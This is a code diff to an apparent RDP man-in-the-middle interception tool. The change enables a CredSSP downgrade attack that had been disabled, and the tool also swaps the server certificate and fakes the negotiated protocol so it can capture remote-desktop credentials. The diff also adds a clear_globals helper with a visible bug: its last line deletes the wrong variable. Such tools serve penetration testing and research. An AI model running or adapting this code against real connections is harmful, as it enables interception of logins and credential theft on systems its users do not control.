@@ -532,7 +532,7 @@ def parse_rdp(bytes, From="Client"):
 
 def parse_rdp_packet(bytes, From="Client"):
 
-    if len(bytes) < 4: return None
+    if len(bytes) < 4: return b""
     if sym_encryption_enabled():
         bytes = decrypt(bytes, From=From)
     #  hexdump(bytes)
@@ -602,24 +602,19 @@ def tamper_data(bytes, From="Client"):
     if m:
         result = replace_server_cert(bytes)
 
-        # MARKER2
     regex = b".*%s..010c" % hexlify(b"McDn")
     m = re.match(regex, hexlify(bytes))
     if m:
         result = set_fake_requested_protocol(bytes, m)
 
-    global downgrade_credssp
     global server_challenge
-        # MARKER3
-    if (False and From == "Server"
+    if (From == "Server"
         and "server_challenge" in globals()
-        and not "downgrade_credssp" in globals()
        ):
         regex = b"\x30.\xa0.*\x6d"
         m = re.match(regex, bytes)
         if m:
             print("Downgrading CredSSP")
-            downgrade_credssp = True
             result = unhexlify(b"300da003020104a4060204c000005e")
 
 
@@ -747,6 +742,24 @@ def open_sockets():
     remote_socket.connect((args.target_host, args.target_port))
 
 
+def clear_globals():
+    global crypto
+    global server_challenge
+    global keyboard_info
+    global RC4_SBOX_CLIENT
+    global RC4_SBOX_SERVER
+    global downgrade_credssp
+    global RDP_PROTOCOL
+    global RDP_PROTOCOL_OLD
+    if "crypto" in globals(): del crypto
+    if "server_challenge" in globals(): del server_challenge
+    if "keyboard_info" in globals(): del keyboard_info
+    if "RC4_SBOX_CLIENT" in globals(): del RC4_SBOX_CLIENT
+    if "RC4_SBOX_SERVER" in globals(): del RC4_SBOX_SERVER
+    if "downgrade_credssp" in globals(): del downgrade_credssp
+    if "RDP_PROTOCOL" in globals(): del RDP_PROTOCOL
+    if "RDP_PROTOCOL_OLD" in globals(): del RDP_PROTOCOL
+
 def run():
     open_sockets()
     handle_protocol_negotiation()
@@ -754,12 +767,13 @@ def run():
     if not RDP_PROTOCOL == 0:
         enableSSL()
     while True:
+        #  clear_globals()
         try:
             if not forward_data():
                 break
         except ssl.SSLError as e:
             print("SSLError: %s" % str(e))
-        except ConnectionResetError:
+        except (ConnectionResetError, OSError):
             print("The client has disconnected")
 
 
@@ -774,4 +788,4 @@ except KeyboardInterrupt:
     pass
 finally:
     local_socket.close()
-    close()
+    #  close()
